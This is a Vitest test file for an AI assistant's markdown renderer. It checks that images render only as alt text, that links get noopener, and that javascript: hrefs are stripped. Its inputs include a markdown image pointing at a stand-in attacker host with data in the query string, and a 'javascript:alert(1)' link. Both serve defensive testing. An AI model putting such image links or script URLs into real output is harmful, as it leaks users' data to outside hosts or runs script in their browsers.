import { describe, expect, it } from "vitest"
// @ts-ignore -- no @types/react-dom installed
import { renderToStaticMarkup } from "react-dom/server"
import ReactMarkdown from "react-markdown"
import remarkGfm from "remark-gfm"
import { buildComponents } from "./assistant-message"
import { rehypeCitations } from "@/lib/rehype-citations"

const render = (md: string, count = 0) =>
  renderToStaticMarkup(
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={[[rehypeCitations, { count }] as any]}
      components={buildComponents(new Map())}
    >
      {md}
    </ReactMarkdown>
  )

describe("assistant markdown", () => {
  it("never renders <img>, only the alt text", () => {
    const html = render("before ![secret alt](https://attacker.example/?q=health) after")
    expect(html).not.toContain("<img")
    expect(html).not.toContain("attacker.example")
    expect(html).toContain("secret alt")
  })
  it("renders links as click-to-open with noopener", () => {
    const html = render("[x](https://example.com)")
    expect(html).toContain('rel="noopener noreferrer"')
    expect(html).toContain('target="_blank"')
  })
  it("does not render a javascript: link href", () => {
    expect(render("[x](javascript:alert(1))")).not.toContain("javascript:")
  })
})
